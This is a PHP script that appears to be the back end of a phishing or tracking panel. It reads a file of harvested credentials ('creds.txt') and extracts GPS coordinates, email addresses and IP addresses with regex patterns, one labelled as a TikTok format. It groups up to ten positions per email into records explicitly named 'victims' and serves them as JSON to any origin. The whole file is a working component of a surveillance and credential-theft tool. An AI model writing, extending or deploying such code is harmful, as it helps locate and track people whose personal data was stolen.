<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');

$credsFile = 'creds.txt';
if (!file_exists($credsFile)) {
    echo json_encode([]);
    exit;
}

$creds = file_get_contents($credsFile);

// MULTI-FORMAT GPS REGEX (capture TOUS formats)
$gpsPatterns = [
    '/📍\s*GPS\s*POSITION\s*:\s*(-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)/i',
    '/GPS\s*:\s*(-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)/i',
    '/latitude["\']?\s*[:=]\s*(-?\d+(?:\.\d+)?)\s*,\s*longitude["\']?\s*[:=]\s*(-?\d+(?:\.\d+)?)/i',
    '/lat["\']?\s*[:=]\s*(-?\d+(?:\.\d+)?)\s*,\s*lng["\']?\s*[:=]\s*(-?\d+(?:\.\d+)?)/i',
    '/(\d+(?:\.\d+)?),\s*(\d+(?:\.\d+)?)\s*(lat|gps|position)/i',
    '/\|\s*(-?\d+(?:\.\d+)?)\s*\|\s*(-?\d+(?:\.\d+)?)\s*\|/i', // TikTok format
    '/GPS POSITION\s*:?\s*(-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)/i'
];

// Extract GPS positions
$allPositions = [];
foreach ($gpsPatterns as $pattern) {
    if (preg_match_all($pattern, $creds, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $m) {
            $lat = (float)($m[1] ?? 0);
            $lng = (float)($m[2] ?? 0);
            
            // Validation GPS valide
            if (abs($lat) <= 90 && abs($lng) <= 180 && $lat != 0 && $lng != 0) {
                $allPositions[] = [
                    'lat' => $lat,
                    'lng' => $lng,
                    'time' => date('Y-m-d H:i:s')
                ];
            }
        }
    }
}

// Extract emails
preg_match_all('/📧\s*Email\s*:\s*([^\s\n\r]+)/i', $creds, $emailMatches);
preg_match_all('/Email\s*:\s*([^\s\n\r]+)/i', $creds, $email2Matches);
preg_match_all('/email["\']?\s*[:=]\s*["\']?([^\s\n\r"@]+@[^\s\n\r"]+)/i', $creds, $email3Matches);
preg_match_all('/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/', $creds, $email4Matches);

$allEmails = array_unique(array_merge(
    $emailMatches[1] ?? [],
    $email2Matches[1] ?? [],
    $email3Matches[1] ?? [],
    $email4Matches[1] ?? []
));

// Extract IPs
preg_match_all('/IP\s*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i', $creds, $ipMatches);
$allIPs = $ipMatches[1] ?? [];

// Group positions by email (dernières 10 positions)
$victims = [];
$positionIndex = 0;
foreach ($allEmails as $i => $email) {
    $positions = [];
    for ($j = 0; $j < min(10, count($allPositions) - $positionIndex); $j++) {
        $positions[] = $allPositions[$positionIndex + $j];
    }
    $positionIndex += 10;
    
    if (!empty($positions)) {
        $victims[] = [
            'id' => $i + 1,
            'email' => trim($email),
            'ip' => $allIPs[$i] ?? 'unknown',
            'latest' => $positions[0],
            'positions' => $positions,
            'count' => count($positions)
        ];
    }
}

echo json_encode($victims);
?>
